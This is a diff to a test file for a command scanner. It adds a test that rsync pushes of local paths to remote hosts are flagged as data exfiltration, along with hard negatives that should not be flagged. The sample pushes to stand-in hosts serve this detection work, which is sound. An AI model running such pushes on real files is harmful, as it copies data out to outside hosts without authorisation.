@@ -65,6 +65,41 @@ describe("scan", () => {
     }
   });
 
+  it("detects only static local-to-remote rsync pushes as data exfiltration", () => {
+    const pushes = [
+      "rsync -r /tmp/source user@example.test:/srv/destination",
+      "rsync -az ./a ./b rsync://mirror.example.test/module/destination",
+      "rsync -e 'ssh -p 2222' /tmp/source backup.example.test::module",
+      "rsync --exclude '*.tmp' /tmp/source '[2001:db8::1]:/srv/destination'",
+    ];
+    for (const source of pushes) {
+      expect(scan(source).findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "exfil.rsync-push",
+          category: "data_exfiltration",
+          confidence: "high",
+        }),
+      ]));
+    }
+
+    const hardNegatives = [
+      "rsync user@example.test:/srv/source /tmp/destination",
+      "rsync -a /tmp/source /tmp/destination",
+      "rsync --dry-run /tmp/source user@example.test:/srv/destination",
+      "rsync -avn /tmp/source user@example.test:/srv/destination",
+      "rsync source.example.test:/a backup.example.test:/b",
+      "rsync \"$SOURCE\" user@example.test:/srv/destination",
+      "rsync user@example.test:/srv/destination",
+      "echo 'rsync /tmp/source user@example.test:/srv/destination'",
+      "# rsync /tmp/source user@example.test:/srv/destination",
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "exfil.rsync-push"
+      )).toBe(false);
+    }
+  });
+
   it("tracks Python interpreters selected only from trusted discovery candidates", () => {
     const result = scan(`
       which_python=$(which python || which python3 || command -v python3.12)
